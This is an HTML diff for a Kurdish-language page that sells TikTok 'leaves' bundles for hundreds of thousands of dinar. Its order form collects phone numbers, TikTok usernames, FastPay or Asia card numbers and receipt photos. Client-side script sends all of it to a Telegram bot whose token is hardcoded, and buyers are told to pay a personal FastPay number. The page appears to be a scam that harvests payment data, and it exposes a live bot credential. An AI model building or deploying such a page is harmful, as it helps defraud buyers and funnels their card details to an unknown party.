@@ -7,24 +7,22 @@
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
             margin: 0;
             padding: 15px;
             color: #333;
-            background-image: url('https://i.ibb.co/5gyVthsB/7ca03628da19cbaf7044cbd1e3391b89.jpg');
+            background-image: url('https://i.ibb.co/0jQ7X0t/libyan-dinar-bills.jpg');
             background-size: cover;
             background-attachment: fixed;
             background-position: center;
-            background-color: #f5f5f5; /* Fallback color */
         }
         .container {
             max-width: 100%;
-            background-color: rgba(255, 255, 255, 0.85); /* Increased opacity for better readability */
-            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 15px;
             border-radius: 10px;
             box-shadow: 0 0 15px rgba(0,0,0,0.2);
-            backdrop-filter: blur(1px); /* Reduced blur */
-            border: 1px solid rgba(255,255,255,0.3);
-            margin: 0 auto;
+            backdrop-filter: blur(2px);
         }
         .logo {
             text-align: center;
@@ -35,171 +33,383 @@
             height: auto;
             border-radius: 10px;
             border: 2px solid #0066cc;
-            background-color: rgba(255,255,255,0.8);
-            padding: 5px;
         }
         h1 {
             color: #0066cc;
             text-align: center;
-            font-size: 24px;
+            font-size: 22px;
             margin-bottom: 15px;
-            text-shadow: 1px 1px 3px rgba(0,0,0,0.1);
-            background-color: rgba(255,255,255,0.7);
-            padding: 10px;
-            border-radius: 8px;
-            border-left: 4px solid #0066cc;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
         h2 {
-            font-size: 20px;
+            font-size: 18px;
             text-align: center;
             margin-bottom: 15px;
             color: #333;
-            background-color: rgba(255,255,255,0.7);
-            padding: 8px;
-            border-radius: 8px;
         }
         .price-option {
             border: 1px solid #ddd;
-            padding: 15px;
-            margin-bottom: 15px;
+            padding: 12px;
+            margin-bottom: 12px;
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s;
-            background-color: rgba(255,255,255,0.9);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            background-color: rgba(255,255,255,0.8);
         }
         .price-option:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 10px rgba(0,0,0,0.15);
+            transform: translateY(-2px);
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
         }
         .price-option h3 {
             margin: 0;
-            font-size: 18px;
+            font-size: 16px;
             text-align: center;
-            color: #0066cc;
         }
         .form-group {
-            margin-bottom: 20px;
-            background-color: rgba(255,255,255,0.9);
-            padding: 15px;
+            margin-bottom: 15px;
+            background-color: rgba(255,255,255,0.8);
+            padding: 10px;
             border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
         label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 5px;
             font-weight: bold;
-            font-size: 15px;
+            font-size: 14px;
             color: #444;
         }
         input, select {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             border: 1px solid #ddd;
             border-radius: 8px;
             box-sizing: border-box;
-            font-size: 15px;
+            font-size: 14px;
             background-color: #fff;
-            transition: all 0.3s;
-        }
-        input:focus, select:focus {
-            border-color: #0066cc;
-            box-shadow: 0 0 5px rgba(0,102,204,0.3);
-            outline: none;
         }
         .upload-area {
             border: 2px dashed #0066cc;
-            padding: 20px;
+            padding: 15px;
             text-align: center;
-            margin-top: 15px;
+            margin-top: 10px;
             border-radius: 8px;
-            font-size: 15px;
-            background-color: rgba(230, 242, 255, 0.7);
-            transition: all 0.3s;
-        }
-        .upload-area:hover {
-            background-color: rgba(200, 230, 255, 0.7);
+            font-size: 14px;
+            background-color: rgba(230, 242, 255, 0.5);
         }
         button {
             background-color: #0066cc;
             color: white;
             border: none;
-            padding: 15px;
+            padding: 12px;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 18px;
+            font-size: 16px;
             width: 100%;
-            margin-top: 20px;
+            margin-top: 15px;
             transition: all 0.3s;
             font-weight: bold;
-            box-shadow: 0 3px 5px rgba(0,0,0,0.2);
         }
         button:hover {
             background-color: #0055aa;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 10px rgba(0,0,0,0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 3px 5px rgba(0,0,0,0.2);
         }
         small {
-            font-size: 13px;
+            font-size: 12px;
             color: #666;
             display: block;
-            margin-top: 8px;
+            margin-top: 5px;
         }
         .loading {
             display: none;
             text-align: center;
-            margin-top: 15px;
+            margin-top: 10px;
             color: #0066cc;
             font-weight: bold;
-            font-size: 16px;
-            background-color: rgba(255,255,255,0.8);
-            padding: 10px;
-            border-radius: 8px;
         }
         .payment-details {
-            margin-top: 8px;
-            font-size: 14px;
+            margin-top: 5px;
+            font-size: 13px;
             color: #555;
-            text-align: center;
         }
         .payment-instructions {
-            background-color: rgba(240, 248, 255, 0.9);
-            padding: 15px;
+            background-color: #f0f8ff;
+            padding: 10px;
             border-radius: 8px;
-            margin-top: 15px;
+            margin-top: 10px;
             border-right: 4px solid #0066cc;
-            font-size: 14px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            font-size: 13px;
         }
         .payment-instructions ol {
-            padding-right: 20px;
-            margin: 10px 0;
-        }
-        .payment-instructions li {
-            margin-bottom: 8px;
-            line-height: 1.5;
-        }
-        .payment-instructions h4 {
-            color: #0066cc;
-            margin-top: 0;
-            margin-bottom: 10px;
-            font-size: 16px;
-        }
-        .payment-instructions strong {
-            color: #0066cc;
-            font-weight: bold;
+            padding-right: 15px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- بقية الكود كما هي بدون تغيير -->
-        <!-- ... -->
+        <div class="logo">
+            <img src="https://i.ibb.co/kf16Ds4/Screenshot-2025-06-06-05-06-08-907-com-zhiliaoapp-musically-edit.jpg" alt="دۆلاری لیبی هیوا">
+        </div>
+        <h1>دۆلاری لیبی هیوا</h1>
+        <h2>نرخی گەڵاکان</h2>
+        
+        <div class="price-option" onclick="selectOption(this, '20')">
+            <h3>20 گەڵا - 400 هەزار</h3>
+            <div class="payment-details">بە کارتی ئاسیا: 400,000 دینار</div>
+            <div class="payment-details">بە فاستپەی: 400,000 دینار</div>
+        </div>
+        
+        <div class="price-option" onclick="selectOption(this, '40')">
+            <h3>40 گەڵا - 700 هەزار</h3>
+            <div class="payment-details">بە کارتی ئاسیا: 700,000 دینار</div>
+            <div class="payment-details">بە فاستپەی: 700,000 دینار</div>
+        </div>
+        
+        <div class="form-group">
+            <label for="phone">ژمارە مۆبایلی:</label>
+            <input type="tel" id="phone" placeholder="7712345678" pattern="[0-9]{10}">
+            <small>(بەبێ +964 بنووسە)</small>
+        </div>
+        
+        <div class="form-group">
+            <label for="tiktok">یوزەری تیکتۆک:</label>
+            <input type="text" id="tiktok" placeholder="@username">
+        </div>
+        
+        <div class="form-group">
+            <label for="payment">پارەدان:</label>
+            <select id="payment" onchange="showPaymentMethod()">
+                <option value="">هەڵبژێرە</option>
+                <option value="fastpay">فاستپەی</option>
+                <option value="asia">کارتی ئاسیا</option>
+            </select>
+        </div>
+        
+        <div id="fastpay-method" class="form-group" style="display:none;">
+            <label>وێنەی پارەدان:</label>
+            <div class="upload-area">
+                <p>وێنەی پارەدان هەڵبگرە یان کلیک بکە</p>
+                <input type="file" id="fastpay-receipt" accept="image/*">
+            </div>
+            <label for="fastpay-number" style="margin-top:10px;">ژمارە فاستپەی:</label>
+            <input type="text" id="fastpay-number" placeholder="07712345678">
+            <small>بڕی پارە: <span id="fastpay-amount">0</span> دینار</small>
+            
+            <div class="payment-instructions">
+                <h4>ڕێنمایی پارەدان بە فاستپەی:</h4>
+                <ol>
+                    <li>ئەپلیکەیشنی فاستپەی بکەرەوە</li>
+                    <li>بچۆ سەر "پارە ناردن"</li>
+                    <li>ژمارەی فاستپەی ئێمە بنووسە: <strong>7506590395</strong></li>
+                    <li>بڕی پارەکە بنووسە (<span id="fastpay-instruction-amount">0</span> دینار)</li>
+                    <li>پارەکە بنێرە و وێنەی بەڵگەنامەکە هەڵبگرە</li>
+                </ol>
+            </div>
+        </div>
+        
+        <div id="asia-method" class="form-group" style="display:none;">
+            <label>وێنەی کارت:</label>
+            <div class="upload-area">
+                <p>وێنەی کارت هەڵبگرە یان کلیک بکە</p>
+                <input type="file" id="asia-receipt" accept="image/*">
+            </div>
+            <label for="asia-number" style="margin-top:10px;">ژمارە کارتی ئاسیا:</label>
+            <input type="text" id="asia-number" placeholder="6037 XXXX XXXX XXXX">
+            <small>بڕی پارە: <span id="asia-amount">0</span> دینار</small>
+        </div>
+        
+        <div id="loading" class="loading">
+            <p>تکایە چاوەڕێ بکە... زانیاریەکان نێردەرێن</p>
+        </div>
+        
+        <button onclick="submitForm()">تۆمارکردن</button>
     </div>
 
     <script>
-        // الكود البرمجي كما هو بدون تغيير
-        // ...
+        const BOT_TOKEN = '7959091840:AAGQNGFSnAmxp2PRqU44UmJEVo8ecv_5iUA';
+        const CHAT_ID = '7594104612';
+        
+        let selectedOption = null;
+        let selectedAmount = 0;
+        
+        function selectOption(element, option) {
+            document.querySelectorAll('.price-option').forEach(el => {
+                el.style.backgroundColor = '';
+            });
+            
+            element.style.backgroundColor = '#e6f2ff';
+            selectedOption = option;
+            
+            if (option === '20') {
+                selectedAmount = 400000;
+            } else if (option === '40') {
+                selectedAmount = 700000;
+            }
+            
+            // نوێکردنەوەی بڕی پارە لە هەموو شوێنەکان
+            document.getElementById('fastpay-amount').textContent = selectedAmount.toLocaleString();
+            document.getElementById('asia-amount').textContent = selectedAmount.toLocaleString();
+            document.getElementById('fastpay-instruction-amount').textContent = selectedAmount.toLocaleString();
+        }
+        
+        function showPaymentMethod() {
+            const method = document.getElementById('payment').value;
+            
+            document.getElementById('fastpay-method').style.display = 'none';
+            document.getElementById('asia-method').style.display = 'none';
+            
+            if (method === 'fastpay') {
+                document.getElementById('fastpay-method').style.display = 'block';
+            } else if (method === 'asia') {
+                document.getElementById('asia-method').style.display = 'block';
+            }
+        }
+        
+        async function submitForm() {
+            // پشکنینی زانیاریەکان
+            if (!selectedOption) {
+                alert('تکایە ژمارەی گەڵاکان هەڵبژێرە');
+                return;
+            }
+            
+            const phone = document.getElementById('phone').value;
+            if (!phone || !/^[0-9]{10}$/.test(phone)) {
+                alert('ژمارە مۆبایلی 10 ژمارەیی بنووسە (بەبێ +964)');
+                return;
+            }
+            
+            const tiktok = document.getElementById('tiktok').value;
+            if (!tiktok) {
+                alert('تکایە یوزەری تیکتۆک بنووسە');
+                return;
+            }
+            
+            const payment = document.getElementById('payment').value;
+            if (!payment) {
+                alert('تکایە شێوازی پارەدان هەڵبژێرە');
+                return;
+            }
+            
+            let receiptFile = null;
+            let paymentDetails = '';
+            
+            if (payment === 'fastpay') {
+                receiptFile = document.getElementById('fastpay-receipt').files[0];
+                const number = document.getElementById('fastpay-number').value;
+                
+                if (!receiptFile) {
+                    alert('تکایە وێنەی پارەدان هەڵبگرە');
+                    return;
+                }
+                
+                if (!number) {
+                    alert('تکایە ژمارە فاستپەیەکە بنووسە');
+                    return;
+                }
+                
+                paymentDetails = `فاستپەی: ${number} | بڕ: ${selectedAmount.toLocaleString()} دینار | ژمارەی ئێمە: 7506590395`;
+            } else if (payment === 'asia') {
+                receiptFile = document.getElementById('asia-receipt').files[0];
+                const number = document.getElementById('asia-number').value;
+                
+                if (!receiptFile) {
+                    alert('تکایە وێنەی کارت هەڵبگرە');
+                    return;
+                }
+                
+                if (!number) {
+                    alert('تکایە ژمارە کارتی ئاسیا بنووسە');
+                    return;
+                }
+                
+                paymentDetails = `کارتی ئاسیا: ${number} | بڕ: ${selectedAmount.toLocaleString()} دینار`;
+            }
+            
+            // نیشاندانی بارکردن
+            document.getElementById('loading').style.display = 'block';
+            
+            try {
+                // دروستکردنی زانیاریەکان
+                const message = `✅ داواکاری نوێ\n\n` +
+                               `📌 جۆری داواکاری: ${selectedOption === '20' ? '20 گەڵا (400K)' : '40 گەڵا (700K)'}\n` +
+                               `💰 بڕی پارە: ${selectedAmount.toLocaleString()} دینار\n` +
+                               `📞 ژمارە مۆبایل: +964${phone}\n` +
+                               `📱 تیکتۆک: ${tiktok}\n` +
+                               `💳 ${paymentDetails}`;
+                
+                // ناردنی نامەکە بۆ بۆت
+                await sendToTelegram(message);
+                
+                // ناردنی وێنەکە بۆ بۆت
+                if (receiptFile) {
+                    await sendPhotoToTelegram(receiptFile);
+                }
+                
+                alert('✅ زانیاریەکان بەسەرکەوتوویی نێردران! بەزودی پەیوەندیت پێوەدەکرێت');
+                
+                // پاککردنەوەی فۆرمەکە
+                resetForm();
+            } catch (error) {
+                console.error('هەڵە لە ناردنی زانیاریەکان:', error);
+                alert('❌ هەڵەیەک ڕوویدا لە ناردنی زانیاریەکان. تکایە دووبارە هەوڵبدەرەوە');
+            } finally {
+                document.getElementById('loading').style.display = 'none';
+            }
+        }
+        
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('کێشە هەیە لە ناردنی نامەکە');
+            }
+        }
+        
+        async function sendPhotoToTelegram(file) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (!response.ok) {
+                throw new Error('کێشە هەیە لە ناردنی وێنەکە');
+            }
+        }
+        
+        function resetForm() {
+            document.querySelectorAll('.price-option').forEach(el => {
+                el.style.backgroundColor = '';
+            });
+            document.getElementById('phone').value = '';
+            document.getElementById('tiktok').value = '';
+            document.getElementById('payment').value = '';
+            document.getElementById('fastpay-number').value = '';
+            document.getElementById('asia-number').value = '';
+            document.getElementById('fastpay-receipt').value = '';
+            document.getElementById('asia-receipt').value = '';
+            document.getElementById('fastpay-method').style.display = 'none';
+            document.getElementById('asia-method').style.display = 'none';
+            selectedOption = null;
+            selectedAmount = 0;
+        }
     </script>
 </body>
 </html>
